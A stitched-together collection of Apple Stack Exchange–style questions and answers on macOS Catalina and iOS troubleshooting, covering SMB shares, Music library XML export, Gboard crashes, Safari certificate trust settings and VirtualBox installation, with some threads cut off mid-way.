(I kept Mavericks because I like the iBooks highlighting of simulating a real highlighter, but actually, I found that in Mavericks, that feature was gone, and yet I still may update later, as in the past, upgrading the OS have caused my machine not able to boot up and one time I spent close to 8 hours trying to fix it and eventually had to restore it from the backup).\n\nA: Try going to https://www.google.com/chrome/ in Safari on Mavericks and it should offer you to download the latest available update for Mavericks.\nHowever, Chrome will still report itself as outdated, because they have dropped support for Mavericks, and running Chrome risks security issues, etc.\n", "Q: Is there any way to generate an XML file of my Music library in macOS Catalina? I have upgraded to macOS Catalina and have no real complaints. But to the best of my knowledge, some audio applications — mainly DJ playlist-based applications — that use the old iTunes XML library file might be out of luck.\nIs this really the case? Is there no way to generate an XML file based on your Music library in macOS Catalina?\n\nA: While Apple Music does not automatically generate an library XML file, this can be done manually in the app itself.\nWhile the old XML file is not automatically generated anymore, you can manually export an XML file of your Music library in macOS Catalina which — I will assume — is in the same exact format as the old iTunes XML file by following these steps.\nFirst, open up the Music app, go to the “File” menu and choose the “Library” option.\n\nThen, in that list there are two options: “Export Library” and “Export Playlist.” I’m choosing “Export Playlist” for this example.\n\nAfter doing that you will be presented with a fairly standard Apple file save/load interface to save the “Library.xml” file and there you go!\n\nWhile definitely not as convenient as the old way it was constantly generated in iTunes, I believe this should work well for apps that require the XML file.\nSlightly snarky note/criticism from a programer: Why isn’t there a JSON formatting option for export? Let users choose XML or JSON based on needs since — honestly — nobody really likes dealing with XML in 2019.

I had upgraded macOS from Mojave to Catalina yesterday. When I use Command K to connect that SMB share, it doesn’t work. \nDoes the new macOS disable SMB? Help me please, it has decreasesed my work efficiency.\n\nA: I had the same problem and solved it in a strange way, \nAs we are all aware Mac user has actually 2 names: one is the username (the profile name if i may) and the Display name.\nPrior to Catalina , when authenticating with an SMB share from a Windows computer , I was using the display name (although it is a full name with a space - strange for the traditional windows user...) and everything was cool.\nIn Catalina , I found out I can only use the username, windows cannot authenticate with the display name.\nof course , before I got to this point I have checked/enabled SMBv2, created the NetBios file in the MAC and all the other hints I could find, which obviously did not do the trick for me.\nhope this helps\n\nA: SMB is not disabled, but netbios name resolution is. See this answer to test if you just need to set up DNS or reactivate netbios. \n\n\n*\n\n*What causes some Network Drives using SMB no longer connect to macOS Catalina?\nYou can always connect by IP address to test if it’s name resolution before changing your preference files or altering the system configuration. \n\nA: I have been struggling connecting to my QNAP NAS via SMB for a while now too (from Catalina 10.15).  First I switched to afp protocol which seemed to work better, but I hate workarounds instead of solutions. In the end, this seems to have fixed the problem for me: delete the Finder preferences.\nUse the Finder menu to go to a folder (Shift Command G) and copy this path in: ~/Library/Preferences/\nThen locate the file: com.apple.finder.plist and Delete it (move to Trashcan). \nI always empty my trash too, not sure if that's important here.\nSMB is lightning fast now, faster than it's ever been.\n", "Q: Missing header files on macOS Catalina I am having issues with header files on macOS Catalina.

There are many guides explaining how to create and manage snapshots on APFS via tmutil, but all of these seem to only work within the framework of Time Machine local snapshots.\nIs there any way to create an APFS snapshot on an external drive that is neither a backup target for Time Machine, nor itself included in a backup?\nMy scenario is that I'm using an external, APFS-formatted drive for iOS device backups. I would like to be able to keep multiple versions of these without duplicating most files by manually copying the backup directory.\nCurrently I use copy-on-write duplicates as an alternative, but these take a long time to create due to the high number of files and directories; I assume snapshots would anchor the copy at a higher level of the file system and be considerably faster.)\n\nA: I would like to figure out how to do this as well, but have yet to figure out how to do it either. I'm sure it has to be possible somehow because Carbon Copy Cloner can manage snapshots on external drives that you use as backup targets. If CCC can do it, then there must be a way. Until we figure out how to do it manually though, I let CCC do it.\nYou can't tell it to make a snapshot directly, you have to set up a backup task and let it run, but you should be able to get it to work for you. I got it to create snapshots for me by setting up a backup task with an empty folder as the source and by setting it to leave the existing contents of the target drive alone. That way it does nothing to the drive but still makes the snapshot (it makes one on the target drive before and after each backup).\nOnce you have a backup scheme that works for you, you can schedule tasks to run on a schedule, after certain events, or manually. You can even chain tasks together so one runs right after the last, so you don't have to guess how long one will take before the next should start (say one is set to 12:00 and the next at 1:00 - either the one will run long and two will be going at once, or it will run short and you'll have unnecessary down time). I love it. \nIf you haven't already, I would definitely suggest you try it out. I've been using CCC to keep backups up my computer for years now. It is an amazing backup program and they keep adding great new features and tweaking old ones to make them better. Very worth the $40 (I think $30 for students and teachers) and they have a 30-day, full feature trial. You could try it out to see it can do what you are looking for.\nBonus.

Accurate HW failure diagnosis is difficult remotely. Somebody needs to open it up and find out what's wrong.\nApple has some good information here about iPhone batteries.

From Settings -> Sharing, when I try select Internet Sharing from my WiFi connection, there is no option to share with other computers using WiFi.\nI'm running macOS High Sierra 10.13.3\n\n\n\n\nA: While Wi-Fi is the internet connection path, it cannot simultaneously share internet from the same interface. \nThis is similar to iOS's feature, where turning on Wi-Fi disables hotspot. \n", "Q: Vertical lines on left side of MacBook Pro screen I've got a 2016 MacBook Pro. Since this morning the left hand side of the screen has an issue. Almost two centimetres are black with an occasional coloured line. I'm guessing this is a hardware issue rather than software (I've tried a restart).\nWhat's my best course of action? I'm fairly adept at computer hardware maintenance, so if it's a simple case of opening it up and jiggling a cable I can do that.\nI don't have apple care, but my company would pay for the repair anyway (assuming it's not so high it would be a write off).\n\n\nA: I took it to the genius bar and they said the crack itself was accidental damage so couldn't be fixed under warranty.\nHowever the employee looked for other damage which could be and found that the space bar had been rubbing on the screen causing a little damage, and that could be replaced under warranty so I got the entire repair for free. The total cost would have been £558 plus tax.\nI should get it back sometime this weekend. I'm impressed by Apple support this time.\n", "Q: How much storage do photos take up? I am considering asking my parents for an iPhone 7 or 8 for Christmas, but I can't decide between which. \nStraight Talk offers the iPhone 7 with 32 GB and the iPhone 8 with 64 GB.  I'm not planning on downloading any apps on my phone.  How much storage does each photo (all options, resolution, live or not, etc.) use?   \n\nA: The size of the photos will depend on the camera and the size of the images. I have photos on my Mac that run from a few hundred kB to around 4 MB. My backup folder for my Photos has more than 2000 photos and takes up 2.5 GB but I have no movies. I would check the difference in the size of the cameras in the 2 phones. They are probably the same but I don't recall. A 12 MP camera will take images that require more size than a 5 MP camera.\nThat being said, while 32 GB is probably fine for you, I would opt for the 64 GB option. You never know what your interests will be in the future, and you can't increase the size of your memory on an iPhone. You may decide you like to make movies with your iPhone which takes up much more space (think 30 images per sec for a 10-sec movie) or you decide you want to edit your photos or movies which could mean downloading apps. The 64 GB option allows your iPhone content to grow in more areas. This is just my opinion.\n\nA: I'd recommend 64 GB over 32 GB in 2019, but a subscription to iCloud Photo Library will make either manageable.\nAt that point, you can turn on the option to \"Optimize iPhone Storage\".\n\nWith Optimize Storage, smaller, space-saving photos and videos are kept on your device while all of your original, full-resolution versions are stored in iCloud. And as long as you have enough space in iCloud, you can store as many photos and videos as you want.\n\nhttps://support.apple.com/en-us/HT205703\nWith iCloud Photos Library you can have more photos in your Photos Library than your phone itself can hold. \n", "Q: MacBook Pro 2018 no haptic feedback OS Catalina I have a problem with my MacBook Pro 2018.

I do not yet want to step up to Catalina.\n\nI found this useless Apple support page about the Advanced panel that simply repeats the text of the checkboxes’ labels as a pseudo-explanation. (Tip: Click the Helpful? > No button at bottom of that page as feedback to Apple.)\n\n\nA: No it does not.\nI have Mojave and it installed several updates yesterday automatically but a major system upgrade has to be authorized manually. So it is telling me it is there and available but not installing until I give permission.\nEdit: I have the updates checked in the advanced panel and it did not install Catalina.

I use MS Remote Desktop to connect from iMac to my remote Windows 10 computer and exchange files between two computers through a Redirected Folder (the folder itself is on my iMac, and it's visible in Windows as a network drive among other drives like C:). \nThe issue is when I am trying to paste some files into the Redirected Folder through Windows File Explorer, it returns an error: \n\nSince my remote desktop is in Russian here is the translation:\n\n1 action aborted\n  No enough space at \\\\tsclient\\MyRedirectedFolderName. In order to copy these files the destination should have extra 439 Kb\n\nThe requested space is always different depends on files I paste. \nMeanwhile, I still can save files into the folder from any other apps (e.g. I just saved a large PDF file opened in Adobe Acrobat through Save as). Additionally, I don't have this issue when I connect through my MacBook. \nAny chance to fix it?\n\nA: Microsoft Remote Desktop for Mac beta version 10.3.4 (1688) solves the issue. \n", "Q: Catalina Keyboard shortcuts preferences missing 'full keyboard access' \n\n\nvs.\n\n\n\nI am not sure why I do not see this option. I want to see this option because I have for long since been in search of the hotkeys to enable navigation through search results without a mouse click. \nThis seems to be the only option possible without using a plug-in, unless I'm mistaken?\nIt was quite difficult to find leads to (enabling toggling between search results!!!) it, the link that explained the relevant information of what I desire are here for instance.\n\nA: The UI was simply changed in Catalina. In Catalina, ticking \"Use keyboard navigation to move focus between controls\" is identical to selecting \"All controls\" in Mojave. Unticking \"Use keyboard navigation to move focus between controls\" in Catalina is identical to selecting \"Text boxes and lists only\" in Mojave.\nYou can confirm this using Terminal in both versions of macOS and seeing what changes in the output from defaults read (redirect the output to a file and diff the two files). Switching between the radio buttons on Mojave and enabling/disabling the checkbox on Catelina both only change the following preference:\ndefaults read \"Apple Global Domain\" AppleKeyboardUIMode\n\nWhen \"Use keyboard navigation to move focus between controls\" is ticked (or \"All controls\" is selected) the value is 2. When \"Use keyboard navigation to move focus between controls\" is unticked (or \"Text boxes and lists only\" is selected) the value is 0.\n\nA: This has nothing to do with full keyboard control. To make focus move to search results instead of just moving around controls the default shortcut is to use option + tab. You can also change this behaviour in Safari preferences -> advanced -> press tab to highlight each item on a webpage as show in the attached picture.\n\n", "Q: I switched to Catalina and enabled ZSH now my home/end key do not work in terminal I switched to ZSH from BASH as per the upgrade in Catalina and all is well except my home/end keys no longer work.

I just downloaded the new version of OS, and I found out the shortcut key Ctrl-Opt-Cmd-8 doesn't trigger invert colors anymore. I thought maybe they changed the shortcut, so I tried to search in System Preference but ended with no luck. Did Apple remove invert colors? If not, where can I find it? Is there any shortcut key for it? Thanks! \n\nA: I can only use the keyboard shortcut if I go into System Preferences and explicitly unckeck and re-check the box for Invert Colors.  Once I am done with my session I enable screen saver by going to a designated not corner.  When I come back, the keyboard shortcut only produces the system sound for an alert without inverting the colors.  It is again only when I go back into System Preferences and uncheck/re-check Invert Colors will it work again.  This is highly annoying and frustrating as I rely on this for various apps that do not have a dark mode in my normal daily workflow.\n\nA: As discussed in the comment section with @user3439894, we found there're three locations on OS Catalina where you can find the settings regarding to Invert Colors. \n1) System Preferences > Accessibility > Display, use the checkbox to manually activate Invert Colors.  \n2) System Preferences > Keyboard > Shortcuts > Accessibility, use the checkbox to activate shortcut key Ctrl-Opt-Cmd-8 for Invert Colors. Also, do the following in point 3: \n3) System Preferences > Accessibility > Shortcut, use the checkbox \"Invert Display Color\" to use shortcut key Ctrl-Opt-Cmd-8 for Invert Colors. \nIf you found the checkboxs for shortcut is already checked, but when you press shortcut key and it's not working, try to uncheck and recheck the checkboxs. \n\nA: I had the same issue.

With the changes made between Google Photos and Google Drive sync, I'm now moving my photos into iCloud Photos via the macOS Mojave Photos app.\nI have a single folder, from 2007, that I've run into that has 855 photos in it. 41 of them cannot be processed. When I try to add the photos to the Photo app it tells me that I do not have permission to view the photos. I do have permission though, I can open them in Finder, make changes to the photos, copy/paste or rename them.\nI've looked at the permissions and I have read/write set. What else might be preventing the Photos app from allowing the photos to be added? I can go to the Google Photos site and download the same photos back onto my local machine and they still won't get added to macOS Photos. There's something weird with this specific set of photos and I don't know how to resolve it.\nAll previous photos for 2007 were taken with the same camera - I verified that with the EXIF data on the photos for the year.

I went to iCloud.com, opened Photos and was able to upload several of the bad photos without an issue. \nI shut down macOS Photos and re-launched it after it had completed syncing the batch of files it was syncing to iCloud. Reopening Photos had the bad photos I tested on iCloud.com sync down without issue. I then imported the rest of the bad photos and they were added successfully. \nI assume something was messed up in Photos and a restart was needed.\n", "Q: What is the \"default\" font for iPad mail program I was playing around with my new iPad.

It will crash apps, as soon as you try to select older photos from the library for uploading or whatever. The library is shown empty on my mac although there are new photos in the library.\nMy idea is to save the remaining Photos of the phone via 3rd party tools.\nIn the end I like to really factory reset only the photos database. How can this be achieved? Is it possible to delete the associated database files and picture DCIM folders on the iPhone?\n\nA: To answer my own question:\nI felt brave and fired up a 3rd party tool that could access the iPhone filesystem. In the directory Media I renamed the directories PhotoData to PhotoData_old, DCIM to DCIM_old and Photos to Photos_old.\nThen I restarted the iPhone. After reboot completed I checked the Media directory again. PhotoData, DCIM and Photos directory had been recreated. Photos was telling me: No photos found.\nI deleted the _old directories and synced photos from a good and stable library to the phone.\nThe iPhone photos library is now usable.\n", "Q: Rolled back from Catalina back to Mojave but I had two drives one for boot and other for saved files, realised old files are still around I rolled back from Catalina to Mojave because I was having issues, it was my first time to do so and foolishly didn't use Time Machine. \nI have two SSDs, one for boot and the other for my files, and I realise that my files are still on the other drive but I can no longer access them, the folders have the red stop sign.\nIs there a way to access the files and use those folders again as my main user folder?\n\nA: It's an easy task to make your old (Catalina) user folder accesible again. I don't recommend to use it as your (Mojave) user folder though.\nUpgrading from Mojave to Catalina not only changes system files and apps but also may have changed some content of your user folder. After replacing iTunes and its library with the new triplicitas Music, TV and Podcast and their libraries, your old Mojave iTunes won't work anymore. Other files may have been \"upgraded\" too e.g. preferences files, Mail data folder etc.\nYou probably want to move your current user folder (Mojave) to Mac Storage again.\nI assume that you didn't change your macOS shortname (=isa).\n\n\n*\n\n*Rename the old isa (Catalina) folder:\nsudo mv /Volumes/Mac\\ Storage/isa /Volumes/Mac\\ Storage/isa-catalina\n\n\n*Change file and folder permissions of isa-catalina to your current user and group id:\nsudo chown -R `id -u`:`id -g` /Volumes/Mac\\ Storage/isa-catalina\n\n\n*Move your current user folder /Users/isa to /Volumes/Mac\\ Storage\nYou probably followed one of several how-tos (e.g. Move Your Mac's Home Folder to a New Location)\n\n*Move personal files and folders from isa-catalina to isa. As mentioned earlier I don't recommend to move content of isa-catalina/Library/... to isa/Library/... except prefs and config files of non-Apple apps.\nTo get your (\"Catalina\") music/podcast/photo/movie files back you have to dig into the respective folders and *.library files.

Magic Mouse is supported under natively iOS 13, however, my iPad (iOS 12.4) does not meet the hardware requirement for iOS 13.  I would like to be able to use a magic mouse with my iPhone / iPad running 12.4.  Is this supported natively (preferable) in 12.X or is there a procedure to enable the magic mouse on iOS 12?\nA 2018 iPhone video predates iOS 13 and shows mouse control: though the mouse hardware is not known: my goal is to use the Magic Mouse\n\nA: The Magic Mouse does work with iOS 13, you'll need to use a PIN code of 0000 to pair it. If you have trouble getting the mouse into pairing mode, remove the batteries from the mouse and re-insert them after a short while. This forces it into discovery mode, where you can pair it.\nThe Magic Mouse 2 is slightly more complicated, as it did not work in the betas of iOS 13 at all. It is however supported in the final release of iOS 13 - however note that the iOS 13 support for Magic Mouse 2 so far includes only pointing support and clicks. There's no support for any gestures.\nThere's no way to enable the Magic Mouse on iOS 12.\nThe video you have linked to shows an iOS Simulator running on a Mac. Here the mouse is obviously supported. This doesn't make it possible to get it working with a real iPad with iOS 12. \nA few apps exists with mouse support for iOS 12 and earlier. They do not support the Magic Mouse though. They only support special hardware, and it's not supported system wide - but only limited to a single app. For example you can get a Swiftpoint GT Mouse for use with the VMware Horizon Client for remote desktopping.\n", "Q: Stuck on Apple Logo while trying to install Snow Leopard on MacBook Pro I purchased a used MBP (without a hard drive). See model details/specs below. I am trying to install Mac OS X Snow Leopard (Version 10.6.3). I have successfully done this using the same process on two older MacBooks (A1151, A1181).\nI searched the Ask Different postings and did not find what I was looking for. Many similar ones exist. But most folks with this issue have the original, still working HD to work with. Not me.\nI also confirmed that my MBP is compatible with Snow Leopard. Compatibility list on Everymac.com \nHere’s mine.\nApple MacBook Pro \"Core i5\" 2.4 15\" Mid-2010 Specs\nIdentifiers: Mid-2010 15\" - MC371LL/A - MacBookPro6,2 - A1286 - 2353*\nModel: A1286\n\nSpecs listed on everymac\nI purchased a retail copy of Snow Leopard. I have it on DVD and I have imaged it to a USB stick with Disk Utility to make for easier installations. Then I installed a hard drive into the MBP, held down the Option/Alt key to boot from the USB drive. It then, as expected, shows me the only option which is to boot the Mac OS X Install DVD. As soon as I hit Enter, the screen changes to the Apple logo screen (with nothing else, no progress meter, no spinner). And there it stays.\nI’ve left it untouched overnight. I’ve tried using the DVD instead of USB. I’ve reset the NVRAM/PRAM more times than I can count. I’ve tried using different hard drives. Different Memory. Swapped the sticks. Used only one slot. I tried installing Leopard (10.5 via CPU Drop-in DVD). Nothing seems to let it get past this screen. I don’t want to give up on it since it’s such a lovely machine.\nHere’s a small google photos album for reference.\nI’ve used the same technique to successfully install Snow Leopard on two older MacBooks (mentioned above). I’ve also booted Ubuntu Linux on USB successfully. So I know the machine is functional.\nAny ideas? What else can I try?\n\nA: Your screenshots show you are not connected to a network. Perhaps if you connect to WiFi or an Ethernet dongle Internet Recovery would kick in.\nAlso if you can connect to another Mac with a cable you could clone that Mac’s OS over to your drive. You could also remove the drive and use a dock to clone from a working machine.\nAfter you clone you could potentially be able to erase the disk and reinstall the OS using the recovery utility.\n\nA: Have you considered doing away with Snow Leopard entirely? I had good experience using this patcher tool: http://dosdude1.com/software.html to install High Sierra on your generation Macbook (officially unsupported for that model, but performing surprisingly well).\n\nA: So I got it working. It was ugly, not how I envisioned, and I'm still not delighted. But it works. Let me explain.\nI mentioned earlier that I successfully used the same method to install Snow Leopard on two older MacBooks. Well that turned out to be the key. You gotta have access to a working installation of the OS. At least I had to in my case. My coworker suggested (as a test) transplanting the hard drive from one of the other MacBooks into the one that was giving me trouble.\nThis ended up working. But there are some caveats and I had to jump through a few hoops. After moving the \"good\" drive to the target MBP, it initially froze at the same spot. But the difference was that now I had a recovery partition. At first, I tried holding Shift and booting. That did nothing.\nAfter that, I tried booting into Recovery Mode with Cmd + R. Instead of starting the recovery wizard (with Disk Utility), the screen immediately changed to showing a globe (not the Apple logo). And it let me connect to the internet. This was new. I was hopeful! It was the Recovery over Internet wizard!\nI connected to my wi-fi and let it do its thing. It took about a half-hour. When it rebooted, I could see that it had downloaded and was booting up High Sierra (which I think is the max OS this MBP will support).\nBut there was a catch. The password I had setup/used on the previous laptop would not work. I guess because the system recognized that it was in a different machine. Maybe the password is paired to the older hardware set(?) No idea.\nWell, I found an article that walked me through resetting the password. That worked flawlessly and it's where the story ends.\nSo I got it to 'work', but it's still not the clean solution I was looking for. I still don't know why I could not start from scratch with a new, empty hard drive installed. I want to test out the suggestions from Lars, Dan, and user711393. But for now, it's working and I'm happy.\nI hope this helps someone else out who encounters a finicky MBP like mine.\nList of helpful sites I used at various stages\n\n\n*\n\n*https://www.makeuseof.com/tag/boot-mode-startup-keys-mac/\n\n*https://www.macworld.co.uk/how-to/mac/restore-mac-without-recovery-3636668/\n\n*https://arstechnica.com/civis/viewtopic.php?t=1217501\n\n*https://www.macworld.co.uk/how-to/mac/forgotten-mac-password-3594395/\nAgain, it's not perfect, but I consider this case closed for now.

On previous versions of iOS, I’ve generally kept the predictive keyboard turned completely off, since I found it very distracting when trying to type.\nHowever, with iOS 13’s new swipe-to-type functionality, I find the predictive keyboard is very necessary in order to correct mispredicted words while swiping. I’d like to be able to quickly turn the predictive keyboard on and off so that I can use it when I feel like swiping but keep it hidden most of the time. \nIn previous versions of iOS, there were at least two ways to quickly toggle the predictive keyboard:\n\n\n*\n\n*Swiping down on the predictive keyboard would collapse it into a smaller form and hide its predictions, and swiping up would restore it. \n\n*When pressing and holding the globe button on the keyboard, there was a toggle switch there that would turn the predictive keyboard off entirely. \n\n\nNow, however, the toggle switch is not present, replaced with a “keyboard settings” option that sends me out to the settings app where I have to hunt for the option, and swiping down on the predictive keyboard appears to do nothing. \nAre these options just gone forever, or is “Keyboard Settings…”—>”Predictive” really the fastest way of toggling the visibility of the predictive keyboard?\n\nA: No, this is currently the only way to turn off the predictive keyboard. As of not, no shortcut exists to do it in the Shortcuts app either.\nThis is also the only way mentioned by this Apple article.\n", "Q: When using Sidecar on MacBook Pro, built-in display is tinted I don't know why, and if this is expected, but I noticed that the built-in display on my MacBook Pro was tinted, as if the system was applying another and incorrect color profile on it, when using Sidecar.\n\nA: I had the exact same problem.

When I click the change keyboard button, I have to cycle through all my keyboards multiple times before gboard actually shows up. The first few cycles, gboard will appear for a split second before crashing and going back to the default english keyboard again.\nPreviously, I had an iphone 7S, which had the exact same symptom. GBoard was working perfectly until I did an OS upgrade, and then it started crashing the exact same way. It gradually got worse with each OS upgrade until it became completely unusable.\n\nA: The assumption you're making is that the problems you're having are related to the upgrade to iOS 13. \nNow, while this assumption may be correct, it's also the case that around the same time iOS 13 was released, Google also updated Gboard to v 2.3.0 and, not long after, to 2.3.1. In other words, not only did the version of iOS change, but also the version of Gboard.\nAs a troubleshooting step it would be good to test the latest version of Gboard on an iPhone that's not running iOS 13. I do appreciate, however, that's not necessarily an option for you.\nSo, what I'd try is totally removing Gboard from your iPhone and then re-installing it from scratch.\nRemoving Gboard\n\n\n*\n\n*Open Settings\n\n*Go to General > Keyboard > Keyboards\n\n*At top right, tap Edit\n\n*In the list tap on Remove next to Gboard\n\n\nRe-installing Gboard\n\n\n*\n\n*Download Gboard from the App Store\n\n*Configure Gboard as per your preferences (keyboard, full access, etc)\n\n\nNow test to see if that's helped to alleviate the situation.\n\nA: Yes I had a similar issue: periodically Gboard keyboard would crash after a second or two (and iOS replacing it with standard keyboard). Not doing anything, simply clicking to write, wait 2 seconds and the screen would change with the standard keyboard. The first time I solved it like I deleted the Gboard app and reinstalled it & rebooted. \nBut now I tried something else & worked: I went to Gboard app, and into the Keyboard Settings menu it has, and for starters disabled all its settings (they are blue radio buttons, put them off all). Then, whenever I would access keyboard, Gboard keybord woud pop up and stay up. So it would function. Then putting back just the settings I need: sliding writing and automatic correction. Works like a charm. \nOf course don't forget to be up to date with all your iPhone iOS version and GBoard app.\n\nA: Go to Gboard's Keyboard Settings and disable \"Share usage statistics\". That worked like a charm for me. Gboard stopped crashing every time I edit a text. I am guessing there is a problem with that setting where it crashes the keyboard.\n\nA: If the other options don't work, try disabling Allow Full Access under Settings > General > Keyboard > Keyboards > Gboard.\nThis disables the Google Search feature, but stopped the crashes for me.\n", "Q: \"This Connection Is Not Private\" → \"Visit The Website\" asks for admin password to \"Update Settings\". Are permanent system changes made? When I try to visit a website that hasn't configured https correctly, this message pops up in Safari.\n\nI appreciate the warning—it lets me know not to enter any personal information on the website. However, if the site is e.g. a standard blog, I still want to read it. So I click \"Show Details\" and then \"visit this website\".\nThis causes Safari to ask for my admin password, in order to make \"changes to [my] Certificate Trust Settings\". I don't want to make any lasting changes to my system, just read one website! Am I somehow making my computer permanently less secure, and if not, why does Safari need my admin password?\n\nWhat is actually happening behind the scenes when I update my Certificate Trust settings in order to view one of these sites?\n\nA: When you enter your password and press Update Settings, what really happens is that the certificate presented by that web site is added to the Certificates set in your login keychain. Your password is needed in order for Safari to have permission to add something to your keychain.\nIf you open up Keychain Access.app, select the login keychain and then the Certificates category, you'll find the specific certificate in the list on the right. The certificate is marked with a blue circle with a white plus inside it. This means it is marked as \"trusted\".\nI.e. you're essentially overriding standard system behavior and stating that you trust a specific certificate even though it is not otherwise trusted (for example because it is expired). This is what will allow you to browse the site without further warnings.\nDoes it make your computer permanently less secure? - In some ways yes, because you're now trusting a certificate that is not really valid. If some malicious person used that certifcate to trick you then the system will trust that certificate. As you're manually stating that you do indeed trust the certificate, you're already aware that something is out of the ordinary, so it's not a huge problem. You just need to be aware that the trust doesn't automatically \"expire\" and disappear the next day or something like that.\nIf you want to manually revoke your trust, you can use Keychain Access.app to right-click on the certificate to Delete it. If you visit the same web site again with Safari, you'll get the warning again.\nNote that some browsers (including Safari in Incognito Mode) solve the problem with overriding invalid certificates by allowing the user to override the warning temporarily. In that case nothing is added to the keychain, thus you do not need to enter a password. You can then browse the web site, but after you have closed down your browser, you'll get warnings again the next time you visit the site. \nAlso note that in these cases, you're only overriding the warning for that specific browser session. I.e. if you're using some other application (i.e. not the browser) to communicate with the site, such as a temporary override won't work. In contrast, doing what Safari does means that other programs (using the system trust store) will also respect your trust in that site.\n\nA: When you allow Safari to \"update settings\", the certificate for that web site is added to a list of trusted certificates in your login keychain for web-based TLS (SSL) traffic, but the exception will be limited in scope since the certificate is not trusted for other uses, like S/MIME, code signing, IPsec encryption, etc.\nIn addition to using the Keychain Access app (as described by @jksoegaard), you can also view (and manipulate) \"trusted certificates\" from the shell using the security command.\nsecurity dump-trust-settings\n\nwill show certificates that have been trusted by the user, including those added when you click the \"Visit this website\" button in Safari. They will have a \"Policy OID\" of \"SSL\" and show the \"Allowed Error\", such as host name mismatch, expired certificate, etc.\nIn addition,\nsecurity dump-trust-settings -d\n\nwill show certificates that have been trusted by the administrator (added by a corporate MDM profile, for example). And\nsecurity dump-trust-settings -s\n\nwill show the certs trusted by macOS by default.\n(Trusted certificates can be removed with security remove-trusted-cert and new ones added via security add-trusted-cert, but require the certificate in DER or PEM format. )\n", "Q: Managing a Child's iPad Without Another Apple Device? I just purchased an iPad for my child. This iPad is the only Apple device that I own. After it arrived, I realized after the fact that iPads apparently do not support more than one user, which is news to me, as I'm an Android user and Android has supported multiple users per device for quite a long time now.\nI don't have an iPhone, another iPad, or even a MacBook, or really any other Apple hardware at all. I have access to Windows 10, so I installed iTunes, but it appears that it's not possible to manage apps via iTunes either. There also doesn't appear to be a way to manage anything from a browser, so it appears that my only method of controlling things is to log into and out of my account and my child's account on the device to manage things, and this appears to wipe everything that I have configured.\nI have created a family profile, I've created a child account, I have purchased an learn-to-read application in my main account, and after logging into my child's account, I can use the application, but it appears that the Screen Time settings get wiped whenever I log out and into the iPad.\nWhat I'm trying to do is the following:\n\n\n*\n\n*Set up this iPad for my child.\n\n*Setup Screen Time for my child to limit access to basically everything, I only want the apps that I select to be usable, no internet access, no maps, etc.\n\n\nDo I really need to buy another iPad in order to manage this iPad, or am I missing something here?\n\nA: What’s wrong with setting a parental restriction passcode and not letting your child know the iCloud password for the account you set up?\n\n\n*\n\n*https://support.apple.com/en-us/HT201304\nPretty much everything you have set up is easily achievable in solo mode. You could also sign up for an MDM like Jamf Now \n\n\n*\n\n*https://www.jamf.com/products/jamf-now/\nThat adds far more options than a family AppleID and has many classroom features and integrations. It’s free for op your first three managed devices and Apple specific MDM. \nLonger term, you might pick up a used phone or iPod touch that can run the latest iOS and manage the shared family AppleID but many of the family features work best with an iOS device for you to manage things remotely from the iPad you leave with your child. \nYou have discovered all the drawbacks so your problem statements leads me to believe you don’t have any more major surprises. Two last recommendations, if your child is less than 13 you need to manage their password and agree to all terms for them. Use your account and birthdate and just don’t give them the password ever. Use a password service like 1Password to save all details about your AppleID, the birth date you entered (people often mis type that when they are wanting to get their account set up), security questions and answers and the password, passcode, unlock PIN, parental PIN, etc...  document everything and keep your proof of purchase if you need Apple to unlock the device if iCloud gets locked by your child entering the password wrong too many times. \n", "Q: How do i pair my keyboard to my ipad? I have charged this keyboard for an hour and turned it on, and it still won't show up on the bluetooth to pair it to the iPad I’m using, when I turn the magic keyboard on the light lights up green then flashes blue then it stops, I don’t know what that means, \nAlso, I don’t know what the button above the power button is for. This keyboard doesn't have a place to change batteries cause it stuck on a fabric that the keyboard doesn't come off, so it's like a book.\n\nA: The Magic Keyboard has rechargeable batteries that cannot be replaced by the user. If you're running low on batteries, plugin a lightning cable to recharge the batteries.\nYou pair it with the iPad by first turning it on (move the slider on the back from the off-position to the green on-position). Then on the iPad open Settings > Bluetooth. Ensure that Bluetooth is enabled, and wait for the Magic Keyboard to appear in the list of devices below. Tap it to pair.\nIf the keyboard does not pair, you might have it paired to another iPad or computer that is nearby. Ensure that you're a good distance from any such device before pairing - or turn those devices off before pairing with your iPad.\n", "Q: iPhone iMessages iRestore Preface\nI have an iPhone and am getting my own phone number. I have been warned that a factory reset will take place when installing the SIM card/phone number. I do not have a Mac computer, nor access to one (all of my friends/family use Windows). I want to be able to view my iMessages chat history (at least the text and timestamp, but images, stickers, reactions etc would be nice) after getting the new number. Turning on \"Backup iMessages to iCloud\" requires setting up 2FA (adding a phone number, which I don't have yet). I am signed into the iPhone with an Apple ID (my_email_handle@gmail.com). The device is not jailbroken.\n\nQuestion\nHow can I view my iPhone iMessages chat history after a factory reset (without a Mac computer to first backup the history)?\n\nA: That's not possible. You should borrow someone's mac to make a backup and restore it after you factory reset it. Or simply fo to an apple store.\nThat said, I don't really see why adding a SIM card to an iPhone would reset it. Could you source that ?\n", "Q: virtualbox installation failed on macOS Catalina I am unable to install virtualbox on macOS Catalina.

This bypassed the normal installation process, so the Security & Privacy System Preference never displayed a prompt that would allow me to grant VirtualBox permission to run.\nThe solution was to download the latest, Catalina-compatable VirtualBox installer .dmg (version 6.12 and up) and run VirtualBox_Uninstall.tool. This failed, but prompted for extra permissions in System Preferences... Security & Privacy. After I granted permission to the uninstall tool, I ran the Uninstall tool again successfully.\nI then ran the VirutalBox install .pkg, which will failed. VirtualBox did install, just not completely. I then launched VirtualBox, which failed, but gave me a prompt in System Preferences... Security & Privacy that allowed me to grant permission for VirtualBox to run.

To validate this understanding, just execute \nls -laO /usr/bin \nSo \"resetting\" this path as you seek to do is a non-starter.\n/usr/bin is full of binaries compiled by Apple themselves.

